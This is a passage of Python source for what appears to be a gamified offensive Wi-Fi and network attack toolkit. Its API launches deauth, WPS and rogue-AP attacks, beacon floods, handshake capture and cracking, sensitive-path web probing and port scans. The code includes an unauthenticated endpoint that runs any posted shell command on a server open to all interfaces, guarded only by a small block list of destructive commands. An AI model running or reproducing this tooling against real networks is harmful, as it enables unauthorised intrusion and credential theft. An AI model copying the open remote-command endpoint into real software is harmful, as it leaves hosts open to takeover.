        except Exception as e:
            push('ERROR', f'tcpdump failed: {e}')
            return
        with _lock:
            _procs['capture_pcap'] = proc
        push('CAPTURE', f'Writing to {os.path.basename(cap_file)}')
        end = time.time() + duration if duration > 0 else None
        while _state['capturing']:
            if end and time.time() >= end:
                break
            if proc.poll() is not None:
                push('WARN', 'tcpdump exited early')
                break
            time.sleep(1)
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
        if os.path.exists(cap_file):
            push('CAPTURE', f'Saved: {os.path.basename(cap_file)} ({os.path.getsize(cap_file)} B)')
        else:
            push('WARN', 'No capture file created')
    except Exception as e:
        push('ERROR', f'Capture error: {e}')
    finally:
        with _lock:
            _state['capturing'] = False
            _procs.pop('capture_pcap', None)

def convert_handshake(cap_file):
    """Convert .cap to hashcat format. Returns (ok, message)."""
    cap_path = os.path.join(HS_DIR, cap_file)
    if not os.path.exists(cap_path):
        return False, f'File not found: {cap_file}'
    hcxtool = _find_bin('hcxpcapngtool', 'hcxpcaptool')
    if hcxtool:
        out = os.path.splitext(cap_path)[0] + '.22000'
        _run([hcxtool, cap_path, '-o', out], timeout=30)
        if os.path.exists(out):
            return True, f'{os.path.basename(out)} (hashcat -m 22000)'
    ac_bin = _find_bin('aircrack-ng')
    if ac_bin:
        base = os.path.splitext(cap_path)[0]
        _run([ac_bin, '-J', base, cap_path], timeout=30)
        out = base + '.hccapx'
        if os.path.exists(out):
            return True, f'{os.path.basename(out)} (hashcat -m 2500)'
    return False, 'No conversion tool (need hcxtools or aircrack-ng)'

# ------------------------------------------------------------------ #
# Web Scanner (stdlib http.client — optional, only used when called)
# ------------------------------------------------------------------ #
def web_scan_thread(url, check_paths=True):
    push('WEBSCAN', f'Scanning: {url}')
    add_xp(15, 'web scan started')
    with _lock:
        _state['web_scanning'] = True
        _results['webscan'] = {}

    findings = {}
    try:
        import http.client

        m = re.match(r'(https?)://([^/:]+)(?::(\d+))?(/.+)?', url)
        if not m:
            push('ERROR', f'Invalid URL: {url}')
            return

        scheme, host, port_str, path = m.groups()
        path = path or '/'
        if scheme == 'https':
            port = int(port_str) if port_str else 443
            if _SSL_AVAILABLE:
                conn = http.client.HTTPSConnection(host, port, timeout=10,
                    context=_ssl_mod._create_unverified_context())
            else:
                conn = http.client.HTTPConnection(host, port, timeout=10)
        else:
            port = int(port_str) if port_str else 80
            conn = http.client.HTTPConnection(host, port, timeout=10)

        push('WEBSCAN', f'Fetching {scheme}://{host}{path}...')
        conn.request('GET', path, headers={
            'User-Agent': 'Mozilla/5.0 (compatible; pwrLVL9000)',
            'Connection': 'close',
        })
        resp = conn.getresponse()
        body = resp.read(8192).decode('utf-8', errors='ignore')
        headers = dict(resp.getheaders())

        findings['status']   = resp.status
        findings['headers']  = headers
        findings['body_len'] = len(body)
        push('WEBSCAN', f'Status: {resp.status} | {len(body)} bytes')

        interesting = []
        hdr_lower = {k.lower(): v for k, v in headers.items()}

        if 'server' in hdr_lower:
            interesting.append(f"Server: {hdr_lower['server']}")
            push('WEBSCAN', f"Server header: {hdr_lower['server']}", {'type': 'header'})

        if 'x-powered-by' in hdr_lower:
            interesting.append(f"X-Powered-By: {hdr_lower['x-powered-by']}")
            push('WEBSCAN', f"X-Powered-By: {hdr_lower['x-powered-by']}", {'type': 'header'})

        for sec_hdr in ['strict-transport-security', 'content-security-policy',
                         'x-frame-options', 'x-xss-protection']:
            if sec_hdr not in hdr_lower:
                interesting.append(f"MISSING: {sec_hdr}")
                push('WARN', f'Missing security header: {sec_hdr}', {'type': 'missing_header'})

        if 'set-cookie' in hdr_lower:
            cookie = hdr_lower['set-cookie']
            issues = []
            if 'httponly' not in cookie.lower():
                issues.append('no HttpOnly')
            if 'secure' not in cookie.lower():
                issues.append('no Secure flag')
            if issues:
                push('WARN', f'Cookie issues: {", ".join(issues)}', {'type': 'cookie'})

        findings['interesting'] = interesting

        patterns = [
            (r'(?i)password\s*[=:]\s*["\']([^"\']{3,})["\']',  'hardcoded_cred'),
            (r'(?i)api[_-]?key\s*[=:]\s*["\']([^"\']{8,})["\']', 'api_key'),
            (r'(?i)secret\s*[=:]\s*["\']([^"\']{6,})["\']',     'secret'),
            (r'(?i)(root|admin|administrator):\$',               'passwd_hash'),
            (r'(?i)<form[^>]+action',                            'form'),
            (r'(?i)<input[^>]+type=["\']password["\']',          'login_form'),
            (r'(?i)sql\s+error|mysql_fetch|ORA-\d+',            'sql_error'),
            (r'(?i)traceback|stack trace|exception at',          'stack_trace'),
        ]
        body_findings = []
        for pat, label in patterns:
            if re.search(pat, body):
                body_findings.append(label)
                push('WARN', f'Body pattern match: {label}', {'type': label})

        findings['body_patterns'] = body_findings

        if check_paths:
            probe_paths = [
                '/admin', '/login', '/wp-admin', '/phpmyadmin',
                '/.git/config', '/.env', '/config.php', '/backup',
                '/api', '/api/v1', '/swagger', '/robots.txt', '/sitemap.xml',
                '/server-status', '/.htaccess', '/web.config',
            ]
            found_paths = []
            for pp in probe_paths:
                if not _state['web_scanning']:
                    break
                try:
                    if scheme == 'https' and _SSL_AVAILABLE:
                        c2 = http.client.HTTPSConnection(host, port, timeout=5,
                            context=_ssl_mod._create_unverified_context())
                    else:
                        c2 = http.client.HTTPConnection(host, port, timeout=5)
                    c2.request('GET', pp, headers={'User-Agent': 'pwrLVL9000', 'Connection': 'close'})
                    r2 = c2.getresponse()
                    r2.read(512)
                    if r2.status in (200, 301, 302, 401, 403):
                        found_paths.append({'path': pp, 'status': r2.status})
                        push('WEBSCAN', f'Found: {pp} [{r2.status}]',
                             {'type': 'path', 'path': pp, 'status': r2.status})
                    c2.close()
                except Exception:
                    pass
            findings['paths'] = found_paths

        with _lock:
            _results['webscan'] = findings
        push('WEBSCAN', f'Web scan complete — {len(findings.get("body_patterns",[]))} pattern hits, '
                        f'{len(findings.get("paths",[]))} interesting paths')

    except Exception as e:
        push('ERROR', f'WebScan error: {e}')
    finally:
        with _lock:
            _state['web_scanning'] = False

# ------------------------------------------------------------------ #
# Network Scanner (raw sockets)
# ------------------------------------------------------------------ #
COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
    443: 'HTTPS', 445: 'SMB', 3306: 'MySQL', 5432: 'PostgreSQL',
    6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
    27017: 'MongoDB', 5900: 'VNC', 3389: 'RDP',
}

def grab_banner(host, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if port in (80, 8080, 8000):
            s.send(b'HEAD / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
        elif port == 22:
            pass
        elif port in (21, 25, 110, 143):
            pass
        else:
            s.send(b'\r\n')
        banner = s.recv(256).decode('utf-8', errors='ignore').strip()
        s.close()
        return banner[:120]
    except Exception:
        return None

def port_scan_host(host, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            result = s.connect_ex((host, port))
            s.close()
            if result == 0:
                banner = grab_banner(host, port)
                service = COMMON_PORTS.get(port, 'unknown')
                open_ports.append({
                    'port': port, 'service': service, 'banner': banner or ''
                })
                add_xp(3, f'open port {port}')
                push('NETSCAN', f'{host}:{port} [{service}] {banner or ""}',
                     {'host': host, 'port': port, 'service': service, 'banner': banner or ''})
        except Exception:
            pass
    return open_ports

def arp_discover(subnet_base):
    hosts = []
    try:
        with open('/proc/net/arp', 'r') as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[2] != '0x0':
                    ip = parts[0]
                    if ip.startswith(subnet_base):
                        hosts.append(ip)
    except Exception:
        pass
    return hosts

def net_scan_thread(target, port_range='common'):
    push('NETSCAN', f'Scanning {target}...')
    add_xp(10, 'net scan started')
    with _lock:
        _state['net_scanning'] = True

    try:
        if port_range == 'common':
            ports = list(COMMON_PORTS.keys())
        elif port_range == 'quick':
            ports = [21, 22, 23, 80, 443, 445, 3306, 8080]
        else:
            m = re.match(r'(\d+)-(\d+)', str(port_range))
            if m:
                ports = list(range(int(m.group(1)), min(int(m.group(2))+1, 65536)))
            else:
                ports = list(COMMON_PORTS.keys())

        if '/' in target:
            m = re.match(r'(\d+\.\d+\.\d+)\.(\d+)/(\d+)', target)
            if m:
                base = m.group(1)
                hosts_raw = arp_discover(base)
                if not hosts_raw:
                    hosts_raw = [f'{base}.{i}' for i in range(1, 10)]

                push('NETSCAN', f'Found {len(hosts_raw)} potential hosts, scanning...')
                all_results = []
                for host in hosts_raw:
                    if not _state['net_scanning']:
                        break
                    open_ports = port_scan_host(host, ports)
                    if open_ports:
                        all_results.append({'host': host, 'ports': open_ports})
                with _lock:
                    _results['network'] = all_results
        else:
            host = target
            push('NETSCAN', f'Scanning {len(ports)} ports on {host}...')

            sem       = threading.Semaphore(20)
            open_ports = []
            port_lock  = threading.Lock()
            threads    = []

            def scan_port(p):
                with sem:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1.5)
                        r = s.connect_ex((host, p))
                        s.close()
                        if r == 0:
                            banner  = grab_banner(host, p)
                            service = COMMON_PORTS.get(p, 'unknown')
                            entry   = {'port': p, 'service': service, 'banner': banner or ''}
                            with port_lock:
                                open_ports.append(entry)
                            push('NETSCAN', f'{host}:{p} [{service}] {banner or ""}',
                                 {'host': host, 'port': p, 'service': service, 'banner': banner or ''})
                    except Exception:
                        pass

            for p in ports:
                if not _state['net_scanning']:
                    break
                t = threading.Thread(target=scan_port, args=(p,), daemon=True)
                threads.append(t)
                t.start()

            for t in threads:
                t.join(timeout=10)

            with _lock:
                _results['network'] = [{'host': host, 'ports': sorted(open_ports, key=lambda x: x['port'])}]

        push('NETSCAN', 'Network scan complete', {'results': _results['network']})

    except Exception as e:
        push('ERROR', f'NetScan error: {e}')
    finally:
        with _lock:
            _state['net_scanning'] = False

# ------------------------------------------------------------------ #
# Handshake loot
# ------------------------------------------------------------------ #
def list_handshakes():
    files = []
    cracked = load_cracked()
    for pattern in ['*.cap', '*.pcap', '*.hccapx', '*.22000']:
        for f in glob.glob(os.path.join(HS_DIR, pattern)):
            name = os.path.basename(f)
            stat = os.stat(f)
            base = re.sub(r'\.(cap|pcap|hccapx|22000)$', '', name)
            files.append({
                'name':    name,
                'size':    stat.st_size,
                'mtime':   stat.st_mtime,
                'cracked': cracked.get(name, cracked.get(base, None)),
            })
    files.sort(key=lambda x: x['mtime'], reverse=True)
    return files

def load_cracked():
    result = {}
    path = os.path.join(LOOT_DIR, 'cracked.txt')
    try:
        with open(path, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    k, _, v = line.partition(':')
                    result[k.strip()] = v.strip()
    except Exception:
        pass
    return result

# ------------------------------------------------------------------ #
# Raw-socket HTTP server
# ------------------------------------------------------------------ #
MIME = {
    '.html': 'text/html; charset=utf-8',
    '.css':  'text/css',
    '.js':   'application/javascript',
    '.json': 'application/json',
    '.png':  'image/png',
    '.ico':  'image/x-icon',
    '.txt':  'text/plain',
}

SPA_PATHS = {'/', '/index.html', '/wifi', '/webscan', '/network', '/loot', '/terminal'}

def _http_response(code, ctype, body, extra_headers=''):
    if isinstance(body, str):
        body = body.encode('utf-8')
    status = {200: 'OK', 204: 'No Content', 404: 'Not Found',
              405: 'Method Not Allowed', 500: 'Internal Server Error'}.get(code, 'Unknown')
    hdr = (
        f'HTTP/1.1 {code} {status}\r\n'
        f'Content-Type: {ctype}\r\n'
        f'Content-Length: {len(body)}\r\n'
        f'Access-Control-Allow-Origin: *\r\n'
        f'Connection: close\r\n'
        + extra_headers +
        '\r\n'
    ).encode()
    return hdr + body

def _send_json(conn, data, code=200):
    body = json.dumps(data).encode()
    conn.sendall(_http_response(code, 'application/json', body))

def _serve_file(conn, path, ctype):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        conn.sendall(_http_response(200, ctype, data))
    except FileNotFoundError:
        conn.sendall(_http_response(404, 'text/plain', b'Not Found'))

def _parse_json_body(body_bytes):
    try:
        return json.loads(body_bytes.decode('utf-8', errors='ignore'))
    except Exception:
        return {}

def _handle_get(conn, path):
    if path in SPA_PATHS:
        _serve_file(conn, os.path.join(WEB_DIR, 'index.html'), 'text/html; charset=utf-8')
        return

    if path == '/events':
        _handle_sse(conn)
        return

    if path == '/api/status':
        _xp = load_xp()
        level, title, xp_next = _calc_level(_xp.get('xp', 0))
        _send_json(conn, {
            'wifi_scanning':  _state['wifi_scanning'],
            'wifi_attacking': _state['wifi_attacking'],
            'web_scanning':   _state['web_scanning'],
            'net_scanning':   _state['net_scanning'],
            'attack_bssid':   _state['attack_bssid'],
            'attack_iface':   _state['attack_iface'],
            'scan_iface':     _state.get('scan_iface'),
            'interfaces':     list_interfaces(),
            'xp':             _xp.get('xp', 0),
            'level':          level,
            'title':          title,
            'xp_next':        xp_next,
            # New tools
            'probe_running':  _state['probe_running'],
            'pmkid_running':  _state['pmkid_running'],
            'beacon_running': _state['beacon_running'],
            'rogueap_running': _state['rogueap_running'],
            'rogueap_ssid':   _state['rogueap_ssid'],
            'wps_scanning':   _state['wps_scanning'],
            'wps_attacking':  _state['wps_attacking'],
            'wps_target':     _state['wps_target'],
            'capturing':      _state['capturing'],
        })
        return

    if path == '/api/xp':
        data = load_xp()
        level, title, xp_next = _calc_level(data.get('xp', 0))
        _send_json(conn, {
            'xp':       data.get('xp', 0),
            'level':    level,
            'title':    title,
            'xp_next':  xp_next,
            'scans':    data.get('scans', 0),
            'attacks':  data.get('attacks', 0),
            'captures': data.get('captures', 0),
            'cracks':   data.get('cracks', 0),
            'ports':    data.get('ports', 0),
        })
        return

    if path == '/api/wifi/results':
        _send_json(conn, {'aps': _results['wifi']})
        return

    if path == '/api/handshakes':
        _send_json(conn, {'files': list_handshakes()})
        return

    if path == '/api/log':
        _send_json(conn, {'events': list(_events)[-200:]})
        return

    if path == '/api/network/results':
        _send_json(conn, {'results': _results['network']})
        return

    if path == '/api/webscan/results':
        _send_json(conn, {'results': _results['webscan']})
        return

    if path == '/api/probe/results':
        with _lock:
            clients = list(_results['probes'].values())
        _send_json(conn, {'clients': clients})
        return

    if path == '/api/clients':
        # Read live client data from whichever airodump CSV exists
        clients = {}
        for prefix in ('/tmp/pwrlvl_scan', '/tmp/pwrlvl_probe'):
            csv = prefix + '-01.csv'
            if os.path.exists(csv):
                clients = parse_airodump_clients(csv)
                break
        _send_json(conn, {'clients': list(clients.values())})
        return

    if path == '/api/wps/results':
        _send_json(conn, {'aps': _results['wps_aps']})
        return

    if path == '/api/rogueap/clients':
        _send_json(conn, {'clients': _results['rogueap_clients']})
        return

    if path == '/api/captures':
        _send_json(conn, {'files': list_pcaps()})
        return

    if path.startswith('/api/download/'):
        filename = path[len('/api/download/'):]
        if not re.match(r'^[\w\-\.]+$', filename):
            conn.sendall(_http_response(403, 'text/plain', b'Forbidden'))
            return
        for search_dir in (LOOT_DIR, HS_DIR):
            fpath = os.path.join(search_dir, filename)
            if os.path.abspath(fpath).startswith(os.path.abspath(search_dir)) \
                    and os.path.isfile(fpath):
                try:
                    with open(fpath, 'rb') as f:
                        data = f.read()
                    extra = f'Content-Disposition: attachment; filename="{filename}"\r\n'
                    conn.sendall(_http_response(200, 'application/octet-stream', data, extra))
                except Exception:
                    conn.sendall(_http_response(500, 'text/plain', b'Read error'))
                return
        conn.sendall(_http_response(404, 'text/plain', b'Not Found'))
        return

    # Static file fallback
    rel   = path.lstrip('/')
    fpath = os.path.join(WEB_DIR, rel)
    # Security: don't serve files outside WEB_DIR
    if not os.path.abspath(fpath).startswith(os.path.abspath(WEB_DIR)):
        conn.sendall(_http_response(403, 'text/plain', b'Forbidden'))
        return
    if os.path.isfile(fpath):
        ext   = os.path.splitext(fpath)[1].lower()
        ctype = MIME.get(ext, 'application/octet-stream')
        _serve_file(conn, fpath, ctype)
    else:
        conn.sendall(_http_response(404, 'text/plain', b'Not Found'))

def _handle_post(conn, path, body_bytes):
    body = _parse_json_body(body_bytes)

    # ---- WiFi ----
    if path == '/api/wifi/scan':
        iface    = body.get('iface', 'wlan0')
        duration = int(body.get('duration', 30))
        if _state['wifi_scanning']:
            _send_json(conn, {'ok': False, 'msg': 'Scan already running'})
            return
        threading.Thread(target=wifi_scan_thread, args=(iface, duration), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Scan started on {iface}'})
        return

    if path == '/api/wifi/stop_scan':
        with _lock:
            _state['wifi_scanning'] = False
        p2 = _procs.pop('scan', None)
        if p2:
            p2.terminate()
        _send_json(conn, {'ok': True})
        return

    if path == '/api/wifi/attack':
        bssid   = body.get('bssid', '')
        channel = body.get('channel', 1)
        iface   = body.get('iface', 'wlan0')
        count   = int(body.get('count', 0))
        if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
            _send_json(conn, {'ok': False, 'msg': 'Invalid BSSID'})
            return
        if _state['wifi_attacking']:
            _send_json(conn, {'ok': False, 'msg': 'Attack already running'})
            return
        threading.Thread(target=wifi_attack_thread, args=(bssid, channel, iface, count), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Attack started → {bssid}'})
        return

    if path == '/api/wifi/stop_attack':
        with _lock:
            _state['wifi_attacking'] = False
        for key in ('deauth', 'capture'):
            pr = _procs.pop(key, None)
            if pr:
                pr.terminate()
        _send_json(conn, {'ok': True})
        return

    if path == '/api/wifi/crack':
        cap_file = body.get('file', '')
        wordlist = body.get('wordlist', '/usr/share/wordlists/rockyou.txt')
        if not cap_file:
            _send_json(conn, {'ok': False, 'msg': 'No file specified'})
            return
        threading.Thread(target=crack_thread, args=(cap_file, wordlist), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Cracking {cap_file}...'})
        return

    if path == '/api/wifi/monitor':
        iface  = body.get('iface', 'wlan0')
        enable = body.get('enable', True)
        try:
            used = set_monitor(iface, enable)
            mode = 'monitor' if enable else 'managed'
            push('INFO', f'{used} → {mode} mode')
            _send_json(conn, {'ok': True, 'msg': f'{used} set to {mode}'})
        except Exception as e:
            _send_json(conn, {'ok': False, 'msg': str(e)})
        return

    # ---- Web Scanner ----
    if path == '/api/webscan':
        url   = body.get('url', '')
        paths = body.get('check_paths', True)
        if not url:
            _send_json(conn, {'ok': False, 'msg': 'No URL specified'})
            return
        if not re.match(r'https?://', url):
            url = 'http://' + url
        if _state['web_scanning']:
            _send_json(conn, {'ok': False, 'msg': 'Scan already running'})
            return
        threading.Thread(target=web_scan_thread, args=(url, paths), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Scanning {url}...'})
        return

    if path == '/api/webscan/stop':
        with _lock:
            _state['web_scanning'] = False
        _send_json(conn, {'ok': True})
        return

    # ---- Network Scanner ----
    if path == '/api/network/scan':
        target     = body.get('target', '')
        port_range = body.get('ports', 'common')
        if not target:
            _send_json(conn, {'ok': False, 'msg': 'No target specified'})
            return
        if _state['net_scanning']:
            _send_json(conn, {'ok': False, 'msg': 'Scan already running'})
            return
        threading.Thread(target=net_scan_thread, args=(target, port_range), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Scanning {target}...'})
        return

    if path == '/api/network/stop':
        with _lock:
            _state['net_scanning'] = False
        _send_json(conn, {'ok': True})
        return

    # ---- Terminal ----
    if path == '/api/terminal':
        cmd = body.get('cmd', '').strip()
        if not cmd:
            _send_json(conn, {'ok': False, 'output': ''})
            return
        _blocked = [
            r':\(\)\{.*\|.*&.*\}',
            r'dd\s+if=/dev/zero\s+of=/dev/(sd|mmcblk|nvme)',
            r'mkfs\s',
            r'>\s*/dev/(sda|mmcblk0)\b',
        ]
        for pat in _blocked:
            if re.search(pat, cmd):
                _send_json(conn, {'ok': False,
                                  'output': f'Blocked: matches destructive pattern'})
                return
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=30, env=os.environ.copy()
            )
            output = (result.stdout + result.stderr).strip()
            push('SHELL', f'$ {cmd}')
            _send_json(conn, {'ok': True, 'output': output[:8192], 'rc': result.returncode})
        except subprocess.TimeoutExpired:
            _send_json(conn, {'ok': True, 'output': 'Command timed out (30s)', 'rc': -1})
        except Exception as e:
            _send_json(conn, {'ok': False, 'output': str(e), 'rc': -1})
        return

    # ---- Probe Sniffer ----
    if path == '/api/probe/start':
        iface    = body.get('iface', 'wlan0')
        duration = int(body.get('duration', 60))
        if _state['probe_running']:
            _send_json(conn, {'ok': False, 'msg': 'Probe scan already running'})
            return
        threading.Thread(target=probe_scan_thread, args=(iface, duration), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Probe scan started on {iface}'})
        return

    if path == '/api/probe/stop':
        with _lock:
            _state['probe_running'] = False
        p2 = _procs.pop('probe', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- PMKID ----
    if path == '/api/pmkid/start':
        iface    = body.get('iface', 'wlan0')
        duration = int(body.get('duration', 60))
        if _state['pmkid_running']:
            _send_json(conn, {'ok': False, 'msg': 'PMKID capture already running'})
            return
        threading.Thread(target=pmkid_thread, args=(iface, duration), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'PMKID capture started on {iface}'})
        return

    if path == '/api/pmkid/stop':
        with _lock:
            _state['pmkid_running'] = False
        p2 = _procs.pop('pmkid', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- Beacon Flood ----
    if path == '/api/beacon/start':
        iface   = body.get('iface', 'wlan0')
        ssids   = body.get('ssids', '')
        channel = int(body.get('channel', 6))
        if _state['beacon_running']:
            _send_json(conn, {'ok': False, 'msg': 'Beacon flood already running'})
            return
        threading.Thread(target=beacon_flood_thread, args=(iface, ssids, channel), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Beacon flood started on {iface}'})
        return

    if path == '/api/beacon/stop':
        with _lock:
            _state['beacon_running'] = False
        p2 = _procs.pop('beacon', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- Rogue AP ----
    if path == '/api/rogueap/start':
        ssid     = body.get('ssid', 'FreeWiFi')
        channel  = int(body.get('channel', 6))
        iface    = body.get('iface', 'wlan1')
        password = body.get('password', '')
        if _state['rogueap_running']:
            _send_json(conn, {'ok': False, 'msg': 'Rogue AP already running'})
            return
        threading.Thread(target=rogueap_thread,
                         args=(ssid, channel, iface, password), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Rogue AP "{ssid}" starting...'})
        return

    if path == '/api/rogueap/stop':
        with _lock:
            _state['rogueap_running'] = False
        p2 = _procs.pop('rogueap', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- WPS ----
    if path == '/api/wps/scan':
        iface    = body.get('iface', 'wlan0')
        duration = int(body.get('duration', 30))
        if _state['wps_scanning']:
            _send_json(conn, {'ok': False, 'msg': 'WPS scan already running'})
            return
        threading.Thread(target=wps_scan_thread, args=(iface, duration), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'WPS scan started on {iface}'})
        return

    if path == '/api/wps/stop_scan':
        with _lock:
            _state['wps_scanning'] = False
        p2 = _procs.pop('wps_scan', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    if path == '/api/wps/attack':
        bssid   = body.get('bssid', '')
        channel = body.get('channel', 1)
        iface   = body.get('iface', 'wlan0')
        if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
            _send_json(conn, {'ok': False, 'msg': 'Invalid BSSID'})
            return
        if _state['wps_attacking']:
            _send_json(conn, {'ok': False, 'msg': 'WPS attack already running'})
            return
        threading.Thread(target=wps_attack_thread, args=(bssid, channel, iface), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'WPS attack → {bssid}'})
        return

    if path == '/api/wps/stop_attack':
        with _lock:
            _state['wps_attacking'] = False
        p2 = _procs.pop('wps_attack', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- Packet Capture ----
    if path == '/api/capture/start':
        iface      = body.get('iface', 'wlan0')
        filter_ex  = body.get('filter', '')
        duration   = int(body.get('duration', 60))
        if _state['capturing']:
            _send_json(conn, {'ok': False, 'msg': 'Capture already running'})
            return
        threading.Thread(target=capture_thread,
                         args=(iface, filter_ex, duration), daemon=True).start()
        _send_json(conn, {'ok': True, 'msg': f'Capture started on {iface}'})
        return

    if path == '/api/capture/stop':
        with _lock:
            _state['capturing'] = False
        p2 = _procs.pop('capture_pcap', None)
        if p2: p2.terminate()
        _send_json(conn, {'ok': True})
        return

    # ---- Handshake conversion ----
    if path == '/api/loot/convert':
        cap_file = body.get('file', '')
        if not cap_file:
            _send_json(conn, {'ok': False, 'msg': 'No file specified'})
            return
        ok, msg = convert_handshake(cap_file)
        _send_json(conn, {'ok': ok, 'msg': msg})
        return

    _send_json(conn, {'ok': False, 'msg': 'Unknown endpoint'}, 404)

def _handle_sse(conn):
    q = queue.Queue(maxsize=200)
    _sse_clients.append(q)

    hdr = (
        'HTTP/1.1 200 OK\r\n'
        'Content-Type: text/event-stream\r\n'
        'Cache-Control: no-cache\r\n'
        'Connection: keep-alive\r\n'
        'Access-Control-Allow-Origin: *\r\n'
        '\r\n'
    ).encode()
    try:
        conn.sendall(hdr)
    except Exception:
        _sse_clients.remove(q)
        return

    # Backfill last 50 events
    for ev in list(_events)[-50:]:
        try:
            conn.sendall(('data: ' + json.dumps(ev) + '\n\n').encode())
        except Exception:
            break

    try:
        while True:
            try:
                ev = q.get(timeout=15)
                conn.sendall(('data: ' + json.dumps(ev) + '\n\n').encode())
            except queue.Empty:
                conn.sendall(b': keepalive\n\n')
    except Exception:
        pass
    finally:
        try:
            _sse_clients.remove(q)
        except Exception:
            pass

def _handle_connection(conn):
    try:
        # Read until we have the full headers
        data = b''
        conn.settimeout(15)
        while b'\r\n\r\n' not in data:
            chunk = conn.recv(4096)
            if not chunk:
                return
            data += chunk
            if len(data) > 65536:
                return

        header_part, body = data.split(b'\r\n\r\n', 1)
        lines = header_part.decode('utf-8', errors='ignore').split('\r\n')
        if not lines:
            return

        parts = lines[0].split()
        if len(parts) < 2:
            return

        method = parts[0].upper()
        path   = parts[1].split('?')[0]

        # Parse Content-Length for POST body
        hdrs = {}
        for line in lines[1:]:
            if ':' in line:
                k, _, v = line.partition(':')
                hdrs[k.strip().lower()] = v.strip()

        content_length = int(hdrs.get('content-length', 0))
        while len(body) < content_length:
            chunk = conn.recv(4096)
            if not chunk:
                break
            body += chunk
        body = body[:content_length]

        if method == 'OPTIONS':
            conn.sendall(_http_response(204, 'text/plain', b'',
                'Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n'
                'Access-Control-Allow-Headers: Content-Type\r\n'))
            return

        if method == 'GET':
            _handle_get(conn, path)
        elif method == 'POST':
            _handle_post(conn, path, body)
        else:
            conn.sendall(_http_response(405, 'text/plain', b'Method Not Allowed'))

    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass

# ------------------------------------------------------------------ #
# Main
# ------------------------------------------------------------------ #
if __name__ == '__main__':
    push('INFO', f'PWRLVL9000 starting on port {PORT}')

    srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv_sock.bind(('', PORT))
    except OSError as e:
        sys.stderr.write(f'ERROR: Cannot bind port {PORT}: {e}\n')
        sys.stderr.flush()
        sys.exit(1)

    srv_sock.listen(20)
    push('INFO', f'Listening on 0.0.0.0:{PORT}')

    while True:
        try:
            conn, addr = srv_sock.accept()
            t = threading.Thread(target=_handle_connection, args=(conn,), daemon=True)
            t.start()
        except Exception:
            pass
